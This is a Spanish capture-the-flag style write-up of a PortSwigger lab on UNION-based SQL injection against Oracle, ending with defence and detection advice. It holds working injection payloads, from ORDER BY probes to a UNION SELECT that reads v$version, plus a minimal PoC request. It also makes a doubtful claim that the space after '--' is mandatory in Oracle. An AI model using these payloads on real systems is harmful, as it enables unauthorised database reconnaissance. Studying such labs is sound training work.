---

id: sqli-03
title: "SQL injection attack, querying the database type and version on Oracle"
category: "SQLi"
difficulty: "Practitioner"
tags: \[portswigger, sqli, oracle, union, practitioner]
date: 2025-08-17
----------------

# SQL injection attack, querying the database type and version on Oracle

**Categoría:** SQLi

**Dificultad:** Practitioner

**Fuente:** PortSwigger Web Security Academy

---

# 🎯 Resumen

* **Objetivo del lab**: Usar un ataque UNION para descubrir la versión de la base de datos (Oracle).
* **Vulnerabilidad principal**: SQL Injection en el parámetro `category`.
* **Impacto esperado**: Exposición de información sensible sobre la versión de la base de datos (banner).

---

# 🧭 Reconocimiento

* **Parámetro vulnerable**: `category` en `/filter`.
* **Prueba de inyección inicial**:

  ```http
  GET /filter?category=Gifts' order by 100-- -   # Error 500 → demasiadas columnas
  GET /filter?category=Gifts' order by 2-- -     # 200 OK → tabla tiene 2 columnas
  ```
* **Observación**: El error 500 indica desajuste en número de columnas.
* **Hipótesis inicial**: Se trata de un entorno Oracle porque MySQL/Postgres no suelen requerir una tabla dummy (`DUAL`).

---

# 🛠️ Explotación paso a paso

## Paso 1 – Determinar número de columnas

* **Qué hago**: Uso `ORDER BY` para adivinar cuántas columnas hay en la consulta original.
* **Por qué funciona**: Si pido más columnas de las que existen, la base de datos devuelve error.
* **Evidencia**: `order by 100` rompe, `order by 2` funciona → la consulta usa 2 columnas.

## Paso 2 – Probar un UNION básico

* **Qué hago**: `UNION SELECT NULL,NULL-- -`
* **Resultado**: Error 500 → indica que falta algo en la sintaxis.
* **Explicación**: En Oracle, cualquier `SELECT` debe extraer datos de al menos una tabla. A diferencia de MySQL/Postgres, no puedes usar `SELECT` sin `FROM`.

## Paso 3 – Uso de tabla DUAL (propia de Oracle)

* **Qué hago**: `UNION SELECT NULL,NULL from DUAL-- -`
* **Por qué funciona**: `DUAL` es una tabla ficticia de una sola fila incluida en Oracle para este tipo de queries.
* **Evidencia**: Respuesta 200 OK → confirmación de que es Oracle.

## Paso 4 – Confirmar inyección controlada

* **Qué hago**: `UNION SELECT 'ABC','TEST' from DUAL-- -`
* **Por qué**: Si aparece en pantalla, significa que puedo inyectar resultados.
* **Evidencia**: En la web se ven “ABC” y “TEST” → confirmación de ejecución.

## Paso 5 – Extraer versión de Oracle

* **Qué hago**:

  ```http
  GET /filter?category=Gifts' UNION SELECT banner,NULL from v$version-- -
  ```
* **Por qué funciona**: `v$version` es una vista de Oracle que muestra la versión del motor y otros detalles.
* **Evidencia**: La respuesta muestra el banner con la versión exacta de Oracle.

---

# ✅ PoC mínima

```http
GET /filter?category=Gifts' UNION SELECT banner,NULL from v$version-- -
Host: <lab-id>.web-security-academy.net
```

Esto devuelve el banner de la versión de Oracle.

---

# 🔒 Defensa

* **Causas**: Entrada no sanitizada concatenada en consultas dinámicas.
* **Detección en logs**:

  * Parámetros que contienen `UNION`, `DUAL`, `v$version`
  * Errores 500 inusuales tras parámetros sospechosos
* **Mitigación recomendada**:

  * Consultas parametrizadas (*prepared statements*)
  * Restringir privilegios: un usuario de aplicación nunca debería poder consultar `v$version`
  * WAF/IDS que identifique patrones de `UNION SELECT`

---

# 📝 Notas y trampas

* **Oracle vs MySQL/Postgres**:

  * Oracle requiere `from DUAL` en queries sin tabla, otros motores no.
  * Las vistas del sistema varían: en MySQL se usa `@@version`, en Postgres `version()`.
* El espacio tras `--` es obligatorio en Oracle para que el resto de la consulta se considere comentario.
* Los banners de versión pueden dar información muy sensible (parches, release exacto) útil para un atacante.

---

# 📚 Referencias

* [PortSwigger Lab – SQL injection attack, querying the database type and version on Oracle](https://portswigger.net/web-security/sql-injection/union-attacks/lab-querying-database-version-oracle)
* [Oracle Docs – The DUAL table](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/DUAL.html)
* [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
